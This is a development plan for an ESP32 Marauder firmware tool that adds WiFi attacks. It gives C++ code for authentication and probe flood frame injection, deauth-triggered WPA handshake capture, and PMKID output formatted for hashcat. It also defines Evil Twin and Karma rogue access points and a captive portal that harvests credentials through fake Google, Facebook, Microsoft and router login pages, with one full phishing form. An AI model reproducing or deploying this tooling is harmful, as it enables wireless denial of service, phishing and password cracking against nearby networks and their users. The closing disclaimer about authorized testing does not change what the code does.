# WiFi Attacks Expansion Plan

## Overview

This plan outlines the expansion of WiFi attack capabilities in the ESP32 Marauder TUI project. The current implementation includes basic scanning, sniffing, and beacon attacks. This expansion adds **Evil Twin**, **Karma Attack**, **Captive Portal**, and various **DoS attacks** to create a comprehensive WiFi penetration testing toolkit.

---

## Current Implementation Status

### ✅ Already Implemented
| Category | Features |
|----------|----------|
| **Scanning** | AP Scan, Station Scan |
| **Sniffing** | Beacon, Probe Request, Deauth, PMKID/EAPOL, Pwnagotchi, Raw |
| **Attacks** | Deauth (broadcast), Beacon Random, Beacon List, Rick Roll, Funny SSIDs |
| **Management** | Channel setting, Target selection, SSID list |

### 🆕 To Be Added
| Category | Features |
|----------|----------|
| **Evil Twin** | Rogue AP, Karma Attack, AP Cloning |
| **Captive Portal** | Credential harvesting with fake login pages |
| **DoS Attacks** | Auth Flood, Assoc Flood, Probe Flood, Continuous Deauth |
| **Enhanced Capture** | WPA Handshake capture, Improved PMKID output |
| **Utilities** | Channel Hopping, Targeted Deauth, Mass Beacon Flood |

---

## Phase 1: Core Infrastructure Updates

### 1.1 Configuration Updates (`Config.h`)

Add new configuration options:

```cpp
// ============================================
// WiFi Attack Configuration
// ============================================

// Evil Twin / Captive Portal
#define EVIL_TWIN_ENABLED           // Enable Evil Twin functionality
#define CAPTIVE_PORTAL_ENABLED      // Enable Captive Portal (adds ~50KB)
#define MAX_CAPTURED_CREDS    20    // Max credentials to store
#define PORTAL_TIMEOUT_MS     300000 // 5 minute portal timeout

// DoS Attack Limits
#define AUTH_FLOOD_RATE       100   // Packets per second
#define ASSOC_FLOOD_RATE      100   // Packets per second
#define PROBE_FLOOD_RATE      200   // Packets per second

// Handshake Capture
#define MAX_HANDSHAKES        5     // Max handshakes to store
#define EAPOL_TIMEOUT_MS      30000 // Timeout for handshake capture

// Channel Hopping
#define CHANNEL_HOP_INTERVAL  500   // ms between channel changes
```

### 1.2 Dependencies Update (`platformio.ini`)

Add web server libraries for Captive Portal:

```ini
lib_deps = 
    h2zero/NimBLE-Arduino@^1.4.0
    bblanchon/ArduinoJson@^6.21.2
    https://github.com/ivanseidel/LinkedList.git
    ; Captive Portal dependencies (optional)
    me-no-dev/ESPAsyncWebServer@^1.2.3
    me-no-dev/AsyncTCP@^1.1.1

build_flags = 
    -DMARAUDER_TUI
    -DCORE_DEBUG_LEVEL=0
    -DEVIL_TWIN_ENABLED
    -DCAPTIVE_PORTAL_ENABLED
    -w
```

---

## Phase 2: WiFi Mode & Structure Updates

### 2.1 Extended WiFi Modes (`WiFiAttacks.h`)

```cpp
// Current scan/attack mode - EXPANDED
enum class WiFiMode : uint8_t {
    IDLE,
    
    // Scanning
    SCAN_AP,
    SCAN_STATION,
    SCAN_CHANNEL_HOP,       // NEW: Scan while hopping channels
    
    // Sniffing
    SNIFF_BEACON,
    SNIFF_PROBE,
    SNIFF_DEAUTH,
    SNIFF_PMKID,
    SNIFF_HANDSHAKE,        // NEW: Full WPA handshake capture
    SNIFF_PWN,
    SNIFF_RAW,
    
    // Beacon Attacks
    ATTACK_DEAUTH,
    ATTACK_DEAUTH_TARGETED, // NEW: Single client deauth
    ATTACK_DEAUTH_CONTINUOUS, // NEW: Persistent deauth
    ATTACK_BEACON_RANDOM,
    ATTACK_BEACON_LIST,
    ATTACK_BEACON_CLONE,    // NEW: Clone nearby APs
    ATTACK_BEACON_FLOOD,    // NEW: Mass beacon flood
    ATTACK_RICKROLL,
    ATTACK_FUNNY,
    
    // DoS Attacks
    ATTACK_AUTH_FLOOD,      // NEW: Authentication flood
    ATTACK_ASSOC_FLOOD,     // NEW: Association flood
    ATTACK_PROBE_FLOOD,     // NEW: Probe request flood
    
    // Evil Twin
    EVIL_TWIN_ACTIVE,       // NEW: Rogue AP running
    KARMA_ACTIVE,           // NEW: Karma attack active
    
    // Captive Portal
    PORTAL_ACTIVE           // NEW: Captive portal serving
};
```

### 2.2 New Data Structures

```cpp
// Captured credential structure
struct CapturedCredential {
    char ssid[33];
    char username[64];
    char password[64];
    uint8_t clientMAC[6];
    uint32_t timestamp;
};

// WPA Handshake structure
struct WPAHandshake {
    uint8_t bssid[6];
    uint8_t clientMAC[6];
    char ssid[33];
    uint8_t anonce[32];
    uint8_t snonce[32];
    uint8_t mic[16];
    uint8_t eapolFrame[256];
    uint16_t eapolLen;
    uint8_t messageNum;  // Which EAPOL message (1-4)
    bool complete;
};

// Karma state
struct KarmaState {
    bool active;
    uint16_t respondedCount;
    char lastSSID[33];
};
```

---

## Phase 3: Evil Twin Implementation

### 3.1 Evil Twin Module (`src/EvilTwin.h`)

```cpp
#pragma once

#include <Arduino.h>
#include "Config.h"

#ifdef EVIL_TWIN_ENABLED

#include <WiFi.h>
#include <DNSServer.h>

class EvilTwin {
public:
    EvilTwin();
    
    // Core functions
    bool start(const char* ssid, uint8_t channel, bool openNetwork = true);
    bool startFromAP(uint8_t apIndex);  // Clone from scanned AP
    void stop();
    bool isActive() const { return _active; }
    
    // Karma Attack
    bool startKarma();
    void stopKarma();
    bool isKarmaActive() const { return _karmaActive; }
    void handleProbeRequest(const uint8_t* payload, int len);
    
    // AP Cloning
    void cloneAllAPs();  // Broadcast all scanned SSIDs
    
    // Status
    uint16_t getClientCount() const;
    void printStatus();
    
    // Configuration
    void setChannel(uint8_t ch) { _channel = ch; }
    void setHidden(bool hidden) { _hidden = hidden; }
    
private:
    bool _active;
    bool _karmaActive;
    bool _hidden;
    uint8_t _channel;
    char _ssid[33];
    
    DNSServer _dnsServer;
    
    void setupDNS();
    void respondToProbe(const char* ssid, const uint8_t* clientMAC);
};

extern EvilTwin evilTwin;

#endif // EVIL_TWIN_ENABLED
```

### 3.2 Evil Twin Features

| Feature | Description |
|---------|-------------|
| **Basic Evil Twin** | Create rogue AP with same SSID as target |
| **Auto-Clone** | Clone SSID, channel from scanned AP |
| **Open Network** | No password (easier to connect) |
| **WPA2 Fake** | Show lock icon but accept any password |
| **Karma Mode** | Auto-respond to all probe requests |
| **Multi-Clone** | Broadcast multiple SSIDs simultaneously |

---

## Phase 4: Captive Portal Implementation

### 4.1 Captive Portal Module (`src/CaptivePortal.h`)

```cpp
#pragma once

#include <Arduino.h>
#include "Config.h"

#ifdef CAPTIVE_PORTAL_ENABLED

#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

// Portal template types
enum class PortalType : uint8_t {
    GENERIC_WIFI,       // Generic "Connect to WiFi" page
    GOOGLE_LOGIN,       // Fake Google sign-in
    FACEBOOK_LOGIN,     // Fake Facebook login
    MICROSOFT_LOGIN,    // Fake Microsoft/Office 365
    ROUTER_ADMIN,       // Router admin panel
    CUSTOM              // User-defined HTML
};

class CaptivePortal {
public:
    CaptivePortal();
    
    // Lifecycle
    bool start(PortalType type);
    bool startWithSSID(const char* ssid, PortalType type);
    void stop();
    bool isActive() const { return _active; }
    
    // Must be called in loop()
    void update();
    
    // Credentials
    uint8_t getCredentialCount() const { return _credCount; }
    CapturedCredential* getCredential(uint8_t index);
    void clearCredentials();
    void printCredentials();
    
    // Customization
    void setCustomHTML(const char* html);
    void setSuccessRedirect(const char* url);
    
private:
    bool _active;
    PortalType _type;
    uint8_t _credCount;
    CapturedCredential _credentials[MAX_CAPTURED_CREDS];
    
    AsyncWebServer* _server;
    DNSServer _dnsServer;
    
    void setupRoutes();
    void handleRoot(AsyncWebServerRequest* request);
    void handleLogin(AsyncWebServerRequest* request);
    void handleSuccess(AsyncWebServerRequest* request);
    void captureCredential(const char* user, const char* pass, const uint8_t* mac);
    
    // HTML Templates
    const char* getTemplate(PortalType type);
    static const char PROGMEM HTML_GENERIC[];
    static const char PROGMEM HTML_GOOGLE[];
    static const char PROGMEM HTML_FACEBOOK[];
    static const char PROGMEM HTML_MICROSOFT[];
    static const char PROGMEM HTML_ROUTER[];
};

extern CaptivePortal captivePortal;

#endif // CAPTIVE_PORTAL_ENABLED
```

### 4.2 Portal Templates

#### Generic WiFi Login (`HTML_GENERIC`)
```html
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>WiFi Login</title>
    <style>
        body{font-family:Arial;background:#1a1a2e;color:#fff;display:flex;
             justify-content:center;align-items:center;height:100vh;margin:0}
        .box{background:#16213e;padding:40px;border-radius:10px;width:300px;
             box-shadow:0 0 20px rgba(0,0,0,0.5)}
        h2{text-align:center;color:#e94560}
        input{width:100%;padding:12px;margin:10px 0;border:none;
              border-radius:5px;box-sizing:border-box}
        button{width:100%;padding:12px;background:#e94560;color:#fff;
               border:none;border-radius:5px;cursor:pointer;font-size:16px}
        button:hover{background:#ff6b6b}
    </style>
</head>
<body>
    <div class="box">
        <h2>🔐 WiFi Login</h2>
        <form action="/login" method="POST">
            <input type="text" name="user" placeholder="Username or Email" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
```

#### Google Login (`HTML_GOOGLE`)
Mimics Google sign-in page with Google branding.

#### Facebook Login (`HTML_FACEBOOK`)
Mimics Facebook login with Facebook branding.

#### Router Admin (`HTML_ROUTER`)
Generic router admin panel asking for admin credentials.

---

## Phase 5: DoS Attacks Implementation

### 5.1 DoS Attack Functions (`WiFiAttacks.h` additions)

```cpp
class WiFiAttacks {
public:
    // ... existing methods ...
    
    // NEW DoS Attacks
    void startAuthFlood(uint8_t apIndex);
    void startAssocFlood(uint8_t apIndex);
    void startProbeFlood();
    void startContinuousDeauth(uint8_t apIndex);
    void startTargetedDeauth(uint8_t apIndex, uint8_t stationIndex);
    
    // NEW Beacon Attacks
    void startBeaconClone();
    void startMassBeaconFlood(uint16_t count);
    
    // NEW Channel Operations
    void startChannelHop(uint16_t intervalMs);
    void stopChannelHop();
    
private:
    // ... existing members ...
    
    // NEW internal methods
    void sendAuthFrame(const uint8_t* ap, const uint8_t* client);
    void sendAssocFrame(const uint8_t* ap, const uint8_t* client);
    void sendProbeRequest(const char* ssid = nullptr);
    void generateRandomMAC(uint8_t* mac);
    
    // Channel hopping
    bool _channelHopping;
    uint16_t _hopInterval;
    uint32_t _lastHop;
};
```

### 5.2 Frame Templates

```cpp
// Authentication frame template (for auth flood)
const uint8_t authFrameTemplate[30] = {
    0xB0, 0x00,                             // Frame Control (Authentication)
    0x3A, 0x01,                             // Duration
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // Destination (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // Source (random)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // BSSID
    0x00, 0x00,                             // Sequence
    0x00, 0x00,                             // Auth Algorithm (Open)
    0x01, 0x00,                             // Auth Sequence
    0x00, 0x00                              // Status
};

// Association request template
const uint8_t assocFrameTemplate[34] = {
    0x00, 0x00,                             // Frame Control (Assoc Request)
    0x3A, 0x01,                             // Duration
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // Destination (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // Source (random)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // BSSID
    0x00, 0x00,                             // Sequence
    0x31, 0x04,                             // Capability
    0x0A, 0x00,                             // Listen Interval
    0x00, 0x00,                             // SSID Tag
    // SSID and other IEs appended dynamically
};

// Probe request template
const uint8_t probeFrameTemplate[24] = {
    0x40, 0x00,                             // Frame Control (Probe Request)
    0x00, 0x00,                             // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,     // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // Source (random)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,     // BSSID (broadcast)
    0x00, 0x00                              // Sequence
    // SSID IE appended dynamically
};
```

### 5.3 DoS Attack Implementations

```cpp
void WiFiAttacks::startAuthFlood(uint8_t apIndex) {
    if (apIndex >= _accessPoints.size()) return;
    
    AccessPoint ap = _accessPoints.get(apIndex);
    _mode = WiFiMode::ATTACK_AUTH_FLOOD;
    _packetCount = 0;
    
    tui.printStatus("Auth flood started - press any key to stop");
}

void WiFiAttacks::sendAuthFrame(const uint8_t* ap, const uint8_t* client) {
    uint8_t frame[30];
    memcpy(frame, authFrameTemplate, 30);
    
    memcpy(&frame[4], ap, 6);      // Destination
    memcpy(&frame[10], client, 6); // Source
    memcpy(&frame[16], ap, 6);     // BSSID
    
    esp_wifi_80211_tx(WIFI_IF_AP, frame, 30, false);
}

void WiFiAttacks::startProbeFlood() {
    _mode = WiFiMode::ATTACK_PROBE_FLOOD;
    _packetCount = 0;
    
    tui.printStatus("Probe flood started - press any key to stop");
}

void WiFiAttacks::sendProbeRequest(const char* ssid) {
    uint8_t frame[64];
    memcpy(frame, probeFrameTemplate, 24);
    
    // Random source MAC
    generateRandomMAC(&frame[10]);
    
    // Add SSID
    int offset = 24;
    frame[offset++] = 0x00;  // SSID Tag
    
    if (ssid && strlen(ssid) > 0) {
        int len = min((int)strlen(ssid), 32);
        frame[offset++] = len;
        memcpy(&frame[offset], ssid, len);
        offset += len;
    } else {
        frame[offset++] = 0;  // Broadcast probe (null SSID)
    }
    
    esp_wifi_80211_tx(WIFI_IF_AP, frame, offset, false);
}

void WiFiAttacks::generateRandomMAC(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(256);
    }
    mac[0] &= 0xFE;  // Unicast
    mac[0] |= 0x02;  // Locally administered
}
```

---

## Phase 6: Enhanced Capture

### 6.1 WPA Handshake Capture

```cpp
void WiFiAttacks::startHandshakeCapture(uint8_t apIndex, bool deauthFirst) {
    if (apIndex >= _accessPoints.size()) return;
    
    _targetAP = _accessPoints.get(apIndex);
    _mode = WiFiMode::SNIFF_HANDSHAKE;
    _packetCount = 0;
    _handshakeComplete = false;
    
    // Set to target channel
    setChannel(_targetAP.channel);
    
    // Enable promiscuous mode
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(handshakeSnifferCallback);
    
    // Optionally trigger deauth to force reconnection
    if (deauthFirst) {
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        for (int i = 0; i < 10; i++) {
            sendDeauthFrame(_targetAP.bssid, broadcast, _targetAP.channel);
            delay(10);
        }
    }
    
    tui.printStatus("Capturing handshake - waiting for client...");
}

static void handshakeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    
    // Look for EAPOL frames (LLC type 0x888E)
    // Parse and store handshake messages 1-4
    // Mark complete when all 4 messages captured
    
    // ... implementation details ...
}

void WiFiAttacks::printHandshake() {
    if (!_handshakeComplete) {
        Serial.println(F("[-] No complete handshake captured"));
        return;
    }
    
    // Output in hashcat-compatible format
    Serial.println(F("\n[+] WPA Handshake captured!"));
    Serial.print(F("SSID: "));
    Serial.println(_capturedHandshake.ssid);
    
    Serial.println(F("\nHashcat format (mode 22000):"));
    // WPA*02*MIC*MAC_AP*MAC_STA*ESSID*ANONCE*EAPOL
    Serial.print(F("WPA*02*"));
    // ... format output ...
}
```

### 6.2 Improved PMKID Output

```cpp
void WiFiAttacks::printPMKID() {
    // Output in hashcat 22000 format
    // PMKID*MAC_AP*MAC_CLIENT*ESSID_HEX
    Serial.println(F("\n[+] PMKID captured!"));
    Serial.println(F("Hashcat format (mode 22000):"));
    
    Serial.print(F("WPA*01*"));
    // Print PMKID (32 hex chars)
    for (int i = 0; i < 16; i++) {
        Serial.printf("%02x", _pmkid[i]);
    }
    Serial.print(F("*"));
    // Print AP MAC
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02x", _targetAP.bssid[i]);
    }
    Serial.print(F("*"));
    // Print Client MAC
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02x", _clientMAC[i]);
    }
    Serial.print(F("*"));
    // Print ESSID in hex
    for (int i = 0; i < strlen(_targetAP.essid.c_str()); i++) {
        Serial.printf("%02x", _targetAP.essid[i]);
    }
    Serial.println();
}
```

---

## Phase 7: Menu Integration

### 7.1 Updated Menu Actions (`MenuDefs.h`)

```cpp
enum class MenuAction : uint8_t {
    NONE,
    SUBMENU,
    BACK,
    
    // Scanning
    WIFI_SCAN_AP,
    WIFI_SCAN_STA,
    WIFI_SCAN_CHANNEL_HOP,          // NEW
    
    // Sniffing
    WIFI_SNIFF_BEACON,
    WIFI_SNIFF_PROBE,
    WIFI_SNIFF_DEAUTH,
    WIFI_SNIFF_PMKID,
    WIFI_SNIFF_HANDSHAKE,           // NEW
    WIFI_SNIFF_PWN,
    WIFI_SNIFF_RAW,
    
    // Deauth Attacks
    WIFI_ATTACK_DEAUTH,
    WIFI_ATTACK_DEAUTH_TARGETED,    // NEW
    WIFI_ATTACK_DEAUTH_CONTINUOUS,  // NEW
    
    // Beacon Attacks
    WIFI_ATTACK_BEACON_RANDOM,
    WIFI_ATTACK_BEACON_LIST,
    WIFI_ATTACK_BEACON_CLONE,       // NEW
    WIFI_ATTACK_BEACON_FLOOD,       // NEW
    WIFI_ATTACK_RICKROLL,
    WIFI_ATTACK_FUNNY,
    
    // DoS Attacks
    WIFI_ATTACK_AUTH_FLOOD,         // NEW
    WIFI_ATTACK_ASSOC_FLOOD,        // NEW
    WIFI_ATTACK_PROBE_FLOOD,        // NEW
    
    // Evil Twin
    WIFI_EVIL_TWIN_START,           // NEW
    WIFI_EVIL_TWIN_STOP,            // NEW
    WIFI_KARMA_START,               // NEW
    WIFI_KARMA_STOP,                // NEW
    
    // Captive Portal
    WIFI_PORTAL_GENERIC,            // NEW
    WIFI_PORTAL_GOOGLE,             // NEW
    WIFI_PORTAL_FACEBOOK,           // NEW
    WIFI_PORTAL_MICROSOFT,          // NEW
    WIFI_PORTAL_ROUTER,             // NEW
    WIFI_PORTAL_STOP,               // NEW
    WIFI_PORTAL_CREDS,              // NEW
    
    // Settings
    WIFI_SET_CHANNEL,
    
    // ... existing BT and other actions ...
};
```

### 7.2 Updated Menu Structure

```cpp
// Deauth submenu (NEW)
const MenuItem wifiDeauthMenu[] = {
    {"Deauth Selected", MenuAction::WIFI_ATTACK_DEAUTH, nullptr, 0},
    {"Targeted Deauth", MenuAction::WIFI_ATTACK_DEAUTH_TARGETED, nullptr, 0},
    {"Continuous DoS", MenuAction::WIFI_ATTACK_DEAUTH_CONTINUOUS, nullptr, 0},
    {"< Back", MenuAction::BACK, nullptr, 0}
};

// Beacon submenu (EXPANDED)
const MenuItem wifiBeaconMenu[] = {
    {"Random SSIDs", MenuAction::WIFI_ATTACK_BEACON_RANDOM, nullptr, 0},
    {"From List", MenuAction::WIFI_ATTACK_BEACON_LIST, nullptr, 0},
    {"Clone APs", MenuAction::WIFI_ATTACK_BEACON_CLONE, nullptr, 0},
    {"Mass Flood", MenuAction::WIFI_ATTACK_BEACON_FLOOD, nullptr, 0},
    {"Rick Roll", MenuAction::WIFI_ATTACK_RICKROLL, nullptr, 0},
    {"Funny SSIDs", MenuAction::WIFI_ATTACK_FUNNY, nullptr, 0},
    {"< Back", MenuAction::BACK, nullptr, 0}
};

// DoS submenu (NEW)
const MenuItem wifiDosMenu[] = {
    {"Auth Flood", MenuAction::WIFI_ATTACK_AUTH_FLOOD, nullptr, 0},
    {"Assoc Flood", MenuAction::WIFI_ATTACK_ASSOC_FLOOD, nullptr, 0},
    {"Probe Flood", MenuAction::WIFI_ATTACK_PROBE_FLOOD, nullptr, 0},
    {"< Back", MenuAction::BACK, nullptr, 0}
};

// Evil Twin submenu (NEW)
const MenuItem wifiEvilTwinMenu[] = {
    {"Start Evil Twin", MenuAction::WIFI_EVIL_TWIN_START, nullptr, 0},
    {"Start Karma", MenuAction::WIFI_KARMA_START, nullptr, 0},
    {"Stop", MenuAction::WIFI_EVIL_TWIN_STOP, nullptr, 0},
    {"< Back", MenuAction::BACK, nullptr, 0}
};

// Portal submenu (NEW)
const MenuItem wifiPortalMenu[] = {
    {"WiFi Login", MenuAction::WIFI_PORTAL_GENERIC, nullptr, 0},
    {"Google Login", MenuAction::WIFI_PORTAL_GOOGLE, nullptr, 0},
    {"Facebook Login", MenuAction::WIFI_PORTAL_FACEBOOK, nullptr, 0},
    {"Microsoft 365", MenuAction::WIFI_PORTAL_MICROSOFT, nullptr, 0},
    {"Router Admin", MenuAction::WIFI_PORTAL_ROUTER, nullptr, 0},
    {"View Creds", MenuAction::WIFI_PORTAL_CREDS, nullptr, 0},
    {"Stop Portal", MenuAction::WIFI_PORTAL_STOP, nullptr, 0},
    {"< Back", MenuAction::BACK, nullptr, 0}
};

// Sniff submenu (EXPANDED)
const MenuItem wifiSniffMenu[] = {
    {"Beacon Frames", MenuAction::WIFI_SNIFF_BEACON, nullptr, 0},
    {"Probe Requests", MenuAction::WIFI_SNIFF_PROBE, nullptr, 0},
    {"Deauth Packets", MenuAction::WIFI_SNIFF_DEAUTH, nullptr, 0},
    {"PMKID/EAPOL", MenuAction::WIFI_SNIFF_PMKID, nullptr, 0},
    {"WPA Handshake", MenuAction::WIFI_SNIFF_HANDSHAKE, nullptr, 0},  // NEW
    {"Pwnagotchi", MenuAction::WIFI_SNIFF_PWN, nullptr, 0},
    {"Raw Packets", MenuAction::WIFI_SNIFF_RAW, nullptr, 0},
    {"< Back", MenuAction::BACK, nullptr, 0}
};

// Attack submenu (REORGANIZED)
const MenuItem wifiAttackMenu[] = {
    {"Deauth >", MenuAction::SUBMENU, wifiDeauthMenu, 4},
    {"Beacon Spam >", MenuAction::SUBMENU, wifiBeaconMenu, 7},
    {"DoS >", MenuAction::SUBMENU, wifiDosMenu, 4},
    {"< Back", MenuAction::BACK, nullptr, 0}
};

// WiFi main menu (EXPANDED)
const MenuItem wifiMenu[] = {
    {"Scan APs", MenuAction::WIFI_SCAN_AP, nullptr, 0},
    {"Scan Stations", MenuAction::WIFI_SCAN_STA, nullptr, 0},
    {"Channel Hop", MenuAction::WIFI_SCAN_CHANNEL_HOP, nullptr, 0},  // NEW
    {"Sniff >", MenuAction::SUBMENU, wifiSniffMenu, 8},
    {"Attack >", MenuAction::SUBMENU, wifiAttackMenu, 4},
    {"Evil Twin >", MenuAction::SUBMENU, wifiEvilTwinMenu, 4},       // NEW
    {"Portal >", MenuAction::SUBMENU, wifiPortalMenu, 8},            // NEW
    {"Set Channel", MenuAction::WIFI_SET_CHANNEL, nullptr, 0},
    {"< Back", MenuAction::BACK, nullptr, 0}
};
```

### 7.3 Updated Menu Tree Visualization

```
ESP32 Marauder TUI v2.0
├── WiFi
│   ├── Scan APs
│   ├── Scan Stations
│   ├── Channel Hop                    [NEW]
│   ├── Sniff >
│   │   ├── Beacon Frames
│   │   ├── Probe Requests
│   │   ├── Deauth Packets
│   │   ├── PMKID/EAPOL
│   │   ├── WPA Handshake              [NEW]
│   │   ├── Pwnagotchi
│   │   └── Raw Packets
│   ├── Attack >
│   │   ├── Deauth >
│   │   │   ├── Deauth Selected
│   │   │   ├── Targeted Deauth        [NEW]
│   │   │   └── Continuous DoS         [NEW]
│   │   ├── Beacon Spam >
│   │   │   ├── Random SSIDs
│   │   │   ├── From List
│   │   │   ├── Clone APs              [NEW]
│   │   │   ├── Mass Flood             [NEW]
│   │   │   ├── Rick Roll
│   │   │   └── Funny SSIDs
│   │   └── DoS >                      [NEW]
│   │       ├── Auth Flood
│   │       ├── Assoc Flood
│   │       └── Probe Flood
│   ├── Evil Twin >                    [NEW]
│   │   ├── Start Evil Twin
│   │   ├── Start Karma
│   │   └── Stop
│   ├── Portal >                       [NEW]
│   │   ├── WiFi Login
│   │   ├── Google Login
│   │   ├── Facebook Login
│   │   ├── Microsoft 365
│   │   ├── Router Admin
│   │   ├── View Creds
│   │   └── Stop Portal
│   └── Set Channel
├── Bluetooth
│   └── ... (unchanged)
├── Targets
│   └── ... (unchanged)
├── Settings
│   └── ... (unchanged)
└── Reboot
```

---

## Phase 8: File Structure

After implementation, the project structure will be:

```
marauder_tui/
├── platformio.ini              # Updated with new dependencies
├── README.md                   # Updated documentation
└── src/
    ├── main.cpp                # Updated with new action handlers
    ├── Config.h                # Updated with new settings
    ├── MenuDefs.h              # Expanded menu definitions
    ├── SerialTUI.h
    ├── SerialTUI.cpp
    ├── WiFiAttacks.h           # Expanded with new attacks
    ├── WiFiAttacks.cpp         # Expanded implementations
    ├── EvilTwin.h              # NEW - Evil Twin module
    ├── EvilTwin.cpp            # NEW
    ├── CaptivePortal.h         # NEW - Captive Portal module
    ├── CaptivePortal.cpp       # NEW
    ├── PortalTemplates.h       # NEW - HTML templates (PROGMEM)
    ├── BTAttacks.h
    └── BTAttacks.cpp
```

---

## Phase 9: Implementation Timeline

| Phase | Description | Estimated Effort | Priority |
|-------|-------------|------------------|----------|
| **1** | Configuration & Dependencies | 1 hour | High |
| **2** | WiFi Mode & Structure Updates | 2 hours | High |
| **3** | Evil Twin Implementation | 3-4 hours | High |
| **4** | Captive Portal Implementation | 4-5 hours | High |
| **5** | DoS Attacks Implementation | 2-3 hours | Medium |
| **6** | Enhanced Capture (Handshake/PMKID) | 3-4 hours | Medium |
| **7** | Menu Integration | 2 hours | High |
| **8** | Testing & Debugging | 3-4 hours | High |

**Total Estimated Time**: 20-25 hours

---

## Phase 10: Testing Checklist

### Evil Twin
- [ ] Evil Twin starts with cloned SSID
- [ ] Clients can connect to rogue AP
- [ ] DNS redirection works
- [ ] Karma responds to probe requests
- [ ] Multiple SSIDs broadcast in clone mode

### Captive Portal
- [ ] Portal pages load correctly
- [ ] Credentials are captured
- [ ] Credentials display via serial
- [ ] All template types work
- [ ] DNS captive detection triggers

### DoS Attacks
- [ ] Auth flood sends packets at expected rate
- [ ] Assoc flood generates random MACs
- [ ] Probe flood operates correctly
- [ ] Continuous deauth persists until stopped
- [ ] Targeted deauth affects single client

### Capture
- [ ] WPA handshake capture detects EAPOL
- [ ] Complete 4-way handshake detected
- [ ] Hashcat format output is valid
- [ ] PMKID output is valid

### General
- [ ] All menu items function correctly
- [ ] No memory leaks during extended operation
- [ ] Channel hopping works across all modes
- [ ] Graceful degradation when features disabled

---

## Memory Considerations

| Feature | Approximate Size | Notes |
|---------|-----------------|-------|
| Base firmware | ~1.0 MB | Current implementation |
| Evil Twin | +20 KB | DNSServer library |
| Captive Portal | +80 KB | ESPAsyncWebServer + HTML |
| DoS attacks | +5 KB | Frame templates |
| Handshake capture | +10 KB | EAPOL parsing |
| **Total** | ~1.1-1.2 MB | Fits in 4MB flash with OTA |

### Optional Features
Features can be disabled to save space:
- `#undef CAPTIVE_PORTAL_ENABLED` - Saves ~80KB
- `#undef EVIL_TWIN_ENABLED` - Saves ~20KB

---

## Legal Disclaimer

> ⚠️ **WARNING**: These attacks can disrupt network services and may be illegal without authorization. This tool is intended for:
> - Security research on your own networks
> - Educational purposes in controlled environments  
> - Authorized penetration testing with written permission
>
> Unauthorized use of these attacks against networks you don't own is illegal in most jurisdictions.

---

## References

- [ESP32 Marauder Original](https://github.com/justcallmekoko/ESP32Marauder)
- [ESP32 WiFi Raw Packet Documentation](https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-reference/network/esp_wifi.html)
- [802.11 Frame Types](https://en.wikipedia.org/wiki/802.11_Frame_Types)
- [EAPOL/WPA Handshake](https://en.wikipedia.org/wiki/IEEE_802.1X)
- [Hashcat Hash Modes](https://hashcat.net/wiki/doku.php?id=hashcat)

---

*Plan created: 2026-01-16*
*Target Version: ESP32 Marauder TUI v2.0*
